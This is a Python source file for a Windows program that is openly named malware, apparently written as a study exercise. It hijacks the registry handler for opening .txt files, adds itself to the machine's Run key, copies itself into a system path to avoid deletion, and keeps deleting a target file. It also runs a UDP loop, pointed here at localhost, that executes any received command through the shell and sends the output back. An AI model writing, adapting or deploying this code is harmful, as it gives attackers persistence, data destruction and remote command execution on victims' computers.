import winreg
import os
import time
import shutil
import sys
import threading
import subprocess
import socket


class Malware(object):
    def __init__(self):
        self.run = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'    # local machine
        self.scriptPath = r'D:\_FILES\CODES\Python\MaliciousCodes_wzk\malware.py'
        self.removePath = r'C:\Users\zhikangwang\Desktop\test.txt'
        self.sysPath = r'C:\xxx.py'
        self.txt = r'txtfile\shell\open\command'    # class root
        self.exePath = r'D:\_FILES\CODES\Python\MaliciousCodes_wzk\dist\malware.exe %1'
        self.flagPath = r'D:\_FILES\CODES\Python\MaliciousCodes_wzk\runFlag.txt'
        self.hostIp = '127.0.0.1'
        self.hostPort = 9999

    def openTxt(self):
        try:
            path = sys.argv[1]
            os.system('notepad {}'.format(path))    # recv arg from outside
            os.remove(path)    # remove this file after opened
        except IndexError as e:    # boot
            # print(e)
            pass
        except OSError:
            pass

    def changeTxtOpen(self):
        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, self.txt, access=winreg.KEY_ALL_ACCESS)
        try:
            # print(winreg.QueryValueEx(key, ""))
            winreg.SetValueEx(key, "", 0, winreg.REG_EXPAND_SZ, self.exePath)    # add
            # print("txt open changed\n")
        except WindowsError:
            # print(WindowsError)
            pass

    def autoRun(self):
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, self.run, 0, access=winreg.KEY_ALL_ACCESS)
        try:
            winreg.SetValueEx(key, "maliciousCode", 0, winreg.REG_SZ, self.scriptPath)    # add this script to Run key
            # print("auto run\n")
        except WindowsError:
            # print(WindowsError)
            pass

    def removeFile(self):
        while True:
            try:
                os.remove(self.removePath)
                # print("removed\n")
                # break
            except OSError:    # if file not exisits or being used, try 10s later
                time.sleep(15)
                # print("no\n")
                # break

    def move2sys(self):
        """
        move this script to system directory in case to be found and deleted
        """
        shutil.copy(self.scriptPath, self.sysPath)

    def sendMsg(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # s.connect(self.hostIp, self.hostPort)
        # s.bind((self.hostIp, self.hostPort))
        while True:
            s.sendto(b'hi', (self.hostIp, self.hostPort))
            recv, _ = s.recvfrom(1024)
            cmd = recv.decode('utf-8')
            rst, _ = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            s.sendto(rst, (self.hostIp, self.hostPort))
            # s.sendto(b'cmd', (self.hostIp, self.hostPort))

    def runCheck(self):
        with open(self.flagPath, 'r') as f:
            flag = f.read(16)
            print(flag)
        with open(self.flagPath, 'w') as f:
            if flag == 'False':    # script not running
                f.write("True")
                return False
            elif flag == 'True':    # script is running
                f.write("True")
                return True
            else:
                print("error")

    def main(self):
        self.openTxt()
        # if self.runCheck() is True:    # script is running
        #     pass
        # else:
        msgThread = threading.Thread(target=self.sendMsg)
        removeThread = threading.Thread(target=self.removeFile)
        msgThread.start()
        removeThread.start()
        self.changeTxtOpen()
        self.autoRun()
        self.move2sys()
        msgThread.join()
        removeThread.join()
        # with open(self.flagPath, 'w') as f:    # when script completed, change flag to 'False'
        #     f.write("False")


if __name__ == "__main__":
    #     pass
    # else:
    # CREATE_NO_WINDOW = 0x08000000
    # subprocess.call('taskkill /F /IM exename.exe', creationflags=CREATE_NO_WINDOW)
    # si = subprocess.star
    # top = tk.Tk()
    # top.withdraw()    # hide window
    malware = Malware()
    malware.main()
    # malware.autoRun()
    # malware.removeFile()
    # malware.move2sys()
    # malware.openTxt()
    # top.mainloop()    # use mainloop to keep script running
